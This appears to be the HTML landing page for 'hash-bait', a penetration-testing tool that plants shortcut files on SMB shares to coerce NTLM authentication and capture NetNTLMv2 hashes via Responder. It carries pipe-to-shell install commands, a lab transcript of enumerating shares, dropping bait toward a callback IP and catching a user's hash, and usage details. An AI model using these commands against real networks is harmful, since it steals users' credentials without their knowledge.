@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>hash-bait: drop poisoned shortcuts on SMB shares to coerce NTLM hashes</title>
+<meta name="description" content="Drop poisoned shortcuts on SMB shares to coerce NTLM hashes">
+<link rel="canonical" href="https://real-fruit-snacks.github.io/hash-bait/">
+<meta property="og:title" content="hash-bait">
+<meta property="og:description" content="Drop poisoned shortcuts on SMB shares to coerce NTLM hashes">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://real-fruit-snacks.github.io/hash-bait/">
+<meta property="og:image" content="https://real-fruit-snacks.github.io/hash-bait/assets/cover-dark.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="560">
+<meta property="og:image:alt" content="hash-bait: bait files on a writable share become NetNTLMv2 captures in Responder">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="icon" href="favicon.ico" sizes="32x32">
+<link rel="icon" href="icon.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="apple-touch-icon.png">
+<link rel="manifest" href="manifest.webmanifest">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#050507">
+<link rel="preload" href="fonts/big-shoulders-stencil-latin.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="fonts/azeret-mono-latin.woff2" as="font" type="font/woff2" crossorigin>
+<script>
+    // Dark (LX 263) default; opt-in light (LX 512) synced via rfs-theme across RFS pages.
+    (function (d) {
+        try {
+            var t = localStorage.getItem('rfs-theme');
+            if (t === 'light' || t === 'dayshift') d.dataset.theme = 'light';
+        } catch (e) {}
+        if (window.matchMedia && matchMedia('(prefers-reduced-motion: no-preference)').matches) d.classList.add('js-run');
+    })(document.documentElement);
+</script>
+<link rel="stylesheet" href="rfs.css">
+<link rel="stylesheet" href="rfs-components.css">
+<link rel="stylesheet" href="styles.css">
+</head>
+<body class="rfs-shell is-bait">
+<a class="rfs-skip" href="#install">Skip to the install line</a>
+
+<header class="rfs-shell-header top">
+    <div class="wrap top-inner">
+        <a class="brand" href="https://real-fruit-snacks.github.io/">
+            <img class="brand-tile" src="icon.svg" alt="" width="28" height="28">
+            <span class="brand-text">HASH-BAIT</span>
+        </a>
+        <nav class="top-nav" aria-label="Links">
+            <a href="#what">What's in it</a>
+            <a href="#tested">Tested on</a>
+            <a href="#issues">Known issues</a>
+            <a href="https://github.com/Real-Fruit-Snacks/hash-bait">GitHub</a>
+        </nav>
+        <button class="theme-btn" type="button" id="theme" aria-pressed="false" aria-label="Switch to LX 512 light theme">
+            <span class="theme-dot" aria-hidden="true"></span>
+            <span class="t-dark">LX 263 DARK</span>
+            <span class="t-light">LX 512 LIGHT</span>
+        </button>
+    </div>
+</header>
+
+<div class="rfs-scroll-region page-scroll" id="page-scroll">
+<main class="wrap stack">
+<section class="card first" aria-labelledby="top-h">
+    <p class="runhead"><b>hash-bait 1.0.0</b><span>Windows · Linux · macOS</span><span>Rust, one static binary</span><span>MIT</span></p>
+    <div class="hero">
+        <div>
+            <h1 class="title" id="top-h">hash-bait</h1>
+            <p class="lead">Drop poisoned shortcuts on SMB shares to coerce NTLM hashes</p>
+            <p class="sub">I got tired of doing this in three tools — one to write the bait files, smbclient to push them, Responder to catch the hashes — and of picking bait out of client shares by hand afterwards. hash-bait is the whole errand as one static binary: it renders <code>.url</code>/<code>.scf</code>/<code>.xml</code> payloads, puts them on the share with its own SMB2/3 stack (no smbclient, no Python), starts Responder, and cleans up after itself. It assumes you have written authorization for the target and a Linux listener on the network. For authorized security testing only.</p>
+            <ol class="ck steps" id="errand-ck" aria-label="The errand, start to finish">
+                <li id="install" data-state="todo"><span class="box" aria-hidden="true"></span><span class="ch">Install</span><span class="ld" aria-hidden="true"></span><span class="rs">Run once</span>
+                    <div class="act"><div class="cmd"><code>irm https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.ps1 | iex</code><button class="copy" type="button" data-copy="irm https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.ps1 | iex">Copy</button></div>
+                    <div class="cmd"><code>curl -fsSL https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.sh | sh</code><button class="copy" type="button" data-copy="curl -fsSL https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.sh | sh">Copy</button></div></div>
+                    <p class="why">PowerShell on Windows, the shell line on Linux or macOS. Each downloads the binary for your platform from the <a href="https://github.com/Real-Fruit-Snacks/hash-bait/releases/latest">latest release</a> and puts it on your PATH; safe to re-run to upgrade. The binaries are not signed — the release page's <code>SHA256SUMS.txt</code> is what you check.</p></li>
+                <li data-step="2" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Shares</span><span class="ld" aria-hidden="true"></span><span class="rs">Enumerated</span></li>
+                <li data-step="3" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Bait</span><span class="ld" aria-hidden="true"></span><span class="rs">Dropped</span></li>
+                <li data-step="4" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Hash</span><span class="ld" aria-hidden="true"></span><span class="rs">Captured</span></li>
+                <li data-step="5" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Share</span><span class="ld" aria-hidden="true"></span><span class="rs">Cleaned</span></li>
+            </ol>
+            <p class="closeout">Nothing left on the share</p>
+        </div>
+
+        <figure class="display" aria-labelledby="session-cap">
+            <div class="screenbox">
+                <p class="bar" aria-hidden="true"><b>A lab run</b><span>zsh · kali</span></p>
+<pre class="screen" id="screen" tabindex="0" aria-label="A hash-bait run: enumerate shares, drop bait, catch a hash, clean up"><code><span class="ln"><span class="p">$</span> <span class="t">hash-bait list -t dc1 -u svc-reader</span></span>
+<span class="ln o">ADMIN$	Remote Admin</span>
+<span class="ln o">C$	Default share</span>
+<span class="ln o">IPC$	Remote IPC</span>
+<span class="ln o">public	drop zone</span>
+<span class="ln" data-step="2"><span class="s">[ok]</span> 4 share(s) on dc1</span>
+
+<span class="ln"><span class="p">$</span> <span class="t">hash-bait drop -t dc1 -c 10.10.14.7 -s public -u svc-reader -i eth0</span></span>
+<span class="ln" data-step="3"><span class="s">[ok]</span> dropped 3 payload(s) on //dc1/public</span>
+<span class="ln"><span class="i">[i]</span> starting Responder on eth0 — Ctrl-C to stop</span>
+<span class="ln o">[+] Listening for events...</span>
+<span class="ln o">[SMB] NTLMv2-SSP Client   : 10.10.11.23</span>
+<span class="ln o">[SMB] NTLMv2-SSP Username : LAB\jdoe</span>
+<span class="ln a" data-step="4">[SMB] NTLMv2-SSP Hash     : jdoe::LAB:4d6f…c21a</span>
+
+<span class="ln"><span class="p">$</span> <span class="t">hash-bait clean -t dc1 -s public -u svc-reader</span></span>
+<span class="ln" data-step="5"><span class="s">[ok]</span> removed 3 payload(s) from //dc1/public</span>
+
+<span class="ln end"><span class="p">$</span> <span class="cursor"></span></span></code></pre>
+            </div>
+            <figcaption id="session-cap">
+                <p class="cap">A scripted run against a throwaway lab DC, with the tool's own output; the password came from <code>$HASH_BAIT_PASSWORD</code>, so no prompt is shown. The three <code>[SMB]</code> lines are Responder's own output with the hash shortened, and the <code>clean</code> ran in a second window after the hash landed.</p>
+                <button class="replay" type="button" data-replay="screen" hidden>Replay</button>
+            </figcaption>
+        </figure>
+    </div>
+</section>
+
+<section class="card ref" id="what" aria-labelledby="what-h">
+    <h2 id="what-h">What's in it</h2>
+    <p class="intro">Four subcommands cover the whole errand. Everything takes <code>--dry-run</code> to print the plan with no side effects, and every status line starts with a bracketed tag — <code>[ok]</code>, <code>[!]</code>, <code>[x]</code>, <code>[i]</code> — so output stays meaningful piped or with <code>NO_COLOR</code> set.</p>
+    <div class="cols">
+        <ul class="ck spec">
+            <li><span class="ch">Drop the bait</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>drop</code></span>
+                <p class="why">Renders <code>@bait.url</code>, <code>@bait.scf</code> and <code>@bait.xml</code> pointing at your callback address and writes them to the share over its own SMB2/3 stack. Starts Responder afterwards unless <code>--no-listen</code>. The leading <code>@</code> sorts the files to the top of Explorer's view; <code>-d</code> targets a subdirectory when the share root is read-only.</p></li>
+            <li><span class="ch">Clean up</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>clean</code></span>
+                <p class="why">Removes previously dropped bait, matched by basename, and warns about any file already gone. Leaving bait on a client's share is how engagements end badly.</p></li>
+            <li><span class="ch">Find the shares</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>list</code></span>
+                <p class="why">Enumerates shares on a target over IPC$ + srvsvc: one line per share, with its remark when the server gives one. Windows only for now — see known issues.</p></li>
+        </ul>
+        <ul class="ck spec">
+            <li><span class="ch">Catch the hashes</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>listen</code></span>
+                <p class="why">Starts Responder on an interface (Linux only) so the coerced authentications land somewhere. On any other platform it says so and exits 4.</p></li>
+            <li><span class="ch">Authenticated sessions</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>-u</code></span>
+                <p class="why"><code>-u svc-reader</code>, <code>-u LAB/svc-reader</code> or <code>-u svc-reader@LAB.LOCAL</code>, with the password from <code>$HASH_BAIT_PASSWORD</code> or an <code>--ask-pass</code> prompt. No username at all tries a guest session — best-effort, see known issues.</p></li>
+            <li><span class="ch">Pick the payloads</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>-p</code></span>
+                <p class="why"><code>-p url,scf,xml</code> (the default, <code>all</code>) or any subset, and <code>--name</code> changes the <code>@bait</code> basename when the default is burned. <code>--save-local</code> also writes copies in the current folder for inspection.</p></li>
+        </ul>
+    </div>
+</section>
+
+<section class="card ref" id="tested" aria-labelledby="tested-h">
+    <h2 id="tested-h">Tested on</h2>
+    <p class="intro">Every check below runs on every commit; the pipeline is public in the repo. What hasn't been run says so.</p>
+    <div class="cols">
+        <ul class="ck" aria-label="Checks run">
+            <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Unit, golden and CLI tests</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
+                <p class="why">18 tests on the build host (Windows 11, stable Rust) and in CI on windows-2022 and ubuntu-24.04, with <code>cargo fmt --check</code> and <code>clippy -D warnings</code>. The golden tests pin the three payload bodies byte-for-byte against the original tool's output.</p></li>
+            <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">A live Windows share, in CI</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
+                <p class="why">The windows-2022 job creates a local user and share, then runs an authenticated <code>drop</code>, <code>list</code> and <code>clean</code> against 127.0.0.1, asserting the three bait files appear and the share is left empty.</p></li>
+        </ul>
+        <ul class="ck" aria-label="More checks">
+            <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">A live Samba share, in CI</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
+                <p class="why">The ubuntu-24.04 job stands up Samba with a real user and asserts authenticated <code>drop</code> and <code>clean</code>. <code>list</code> and the anonymous drop run as informational probes — both fail today for crate reasons, below.</p></li>
+            <li data-state="open"><span class="box" aria-hidden="true"></span><span class="ch">macOS</span><span class="ld" aria-hidden="true"></span><span class="rs">Not run</span>
+                <p class="why">Cross-compiled for aarch64 and x86_64 on every release, unsigned and untested; probably works, no promises. First run needs <code>xattr -d com.apple.quarantine</code> on the binary.</p></li>
+        </ul>
+    </div>
+</section>
+
+<section class="card ref limits" id="issues" aria-labelledby="issues-h">
+    <h2 id="issues-h">Known issues</h2>
+    <ul class="plain">
+        <li><code>listen</code> needs Responder, which only runs on Linux. On Windows it explains and exits 4; the usual split is <code>drop --no-listen</code> from anywhere, <code>hash-bait listen</code> on the Kali box.</li>
+        <li>Anonymous drops are guest sessions — the Rust SMB stack can't express a true null session, so <code>guest</code> + empty password is the portable equivalent. Against servers that accept the session before SSPI completes (Samba <code>map to guest</code>, most NAS devices) the <code>smb</code> crate errors with "SMB session setup succeeded before SSPI authentication completed" — a crate limitation, not fixable from here. Authenticated drops are the tested path; default Windows refuses guest either way.</li>
+        <li><code>list</code> is Windows-only for now. Share enumeration binds DCE/RPC offering only the NDR64 transfer syntax; Windows accepts it, Samba's srvsvc endpoint rejects it. Until the crate learns classic NDR, <code>list</code> fails loudly against Samba and NAS targets while <code>drop</code>/<code>clean</code> work fine.</li>
+        <li><code>--pass</code> is visible in the process list. Prefer <code>--ask-pass</code> or <code>$HASH_BAIT_PASSWORD</code>.</li>
+        <li>Nothing is signed. The Windows SmartScreen and macOS Gatekeeper warnings on first run are expected; <code>SHA256SUMS.txt</code> comes from the same release as the binaries it checks.</li>
+    </ul>
+</section>
+</main>
+
+<footer class="wrap foot">
+    <p>MIT. For authorized security testing with explicit written permission only.</p>
+    <p><a href="https://github.com/Real-Fruit-Snacks/hash-bait">Source</a> · <a href="https://github.com/Real-Fruit-Snacks/hash-bait/blob/main/CHANGELOG.md">Changelog</a> · <a href="https://github.com/Real-Fruit-Snacks/hash-bait/blob/main/SECURITY.md">Security</a> · <a href="https://real-fruit-snacks.github.io/">RFS</a></p>
+</footer>
+</div>
+
+<div id="rfs-toast" class="rfs-toast is-ok" popover="manual" role="status" aria-live="polite"></div>
+<script src="script.js"></script>
+</body>
+</html>
